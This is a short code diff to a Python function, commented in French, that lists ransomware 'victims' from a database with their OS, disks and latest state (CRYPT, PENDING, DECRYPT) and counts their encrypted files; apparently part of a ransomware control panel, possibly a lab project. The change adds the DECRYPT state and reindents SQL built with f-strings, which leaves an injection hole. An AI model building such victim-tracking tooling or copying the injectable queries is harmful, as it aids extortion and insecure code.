@@ -92,18 +92,18 @@ def get_list_victims(conn):
     :return: La liste des victimes
     """
     query = '''
-           SELECT v.hash, v.OS, v.disks, s.state
-           FROM victims v
-           LEFT JOIN (
-               SELECT hash_victim, state
-               FROM states
-               WHERE datetime IN (
-                   SELECT MAX(datetime)
-                   FROM states s2
-                   WHERE s2.hash_victim = states.hash_victim
-               )
-           ) s ON v.hash = s.hash_victim
-       '''
+            SELECT v.hash, v.OS, v.disks, s.state
+            FROM victims v
+            LEFT JOIN (
+                SELECT hash_victim, state
+                FROM states
+                WHERE datetime IN (
+                    SELECT MAX(datetime)
+                    FROM states s2
+                    WHERE s2.hash_victim = states.hash_victim
+                )
+            ) s ON v.hash = s.hash_victim
+        '''
 
     victims = select_data(conn, query)
     victims_list = []
@@ -112,17 +112,18 @@ def get_list_victims(conn):
         hash_victim, os, disks, state = victim
         nb_files = 0
 
-        if state in ('CRYPT', 'PENDING'):
+        # On vérifie aussi pour l’état DECRYPT
+        if state in ('CRYPT', 'PENDING', 'DECRYPT'):
             query_files = f'''
-                   SELECT nb_files
-                   FROM encrypted
-                   WHERE hash_victim = '{hash_victim}'
-                     AND datetime = (
-                       SELECT MAX(datetime)
-                       FROM encrypted
-                       WHERE hash_victim = '{hash_victim}'
-                   )
-               '''
+                    SELECT nb_files
+                    FROM encrypted
+                    WHERE hash_victim = '{hash_victim}'
+                      AND datetime = (
+                        SELECT MAX(datetime)
+                        FROM encrypted
+                        WHERE hash_victim = '{hash_victim}'
+                    )
+                '''
             result = select_data(conn, query_files)
             if result:
                 nb_files = int(result[0][0])
